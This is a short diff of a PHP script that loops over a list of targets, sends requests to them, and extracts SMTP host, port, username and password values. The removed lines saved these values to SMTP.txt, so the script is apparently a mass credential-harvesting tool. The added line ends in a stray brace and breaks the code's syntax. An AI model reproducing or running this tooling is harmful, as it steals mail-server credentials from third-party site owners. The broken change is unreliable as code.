@@ -212,8 +212,7 @@ foreach($read as $cok) {
         );
         $bre = $req->Requests($cok, null, $header, false);
         if ($wibu->smtp['HOST'] != '' || !empty($wibu->smtp['HOST'])) {
-            $data = "{$wibu->smtp['HOST']}|{$wibu->smtp['PORT']}|{$wibu->smtp['USER']}|{$wibu->smtp['PASS']}";
-            Save('SMTP.txt', $data);
+            $data = "{$wibu->smtp['HOST']}|{$wibu->smtp['PORT']}|{$wibu->smtp['USER']}|{$wibu->smtp['PASS']}"{
         }
         if (preg_match('/_ALL_WE_KNOW_/', $bre->body)) {
             echo $cok . " ===> ";
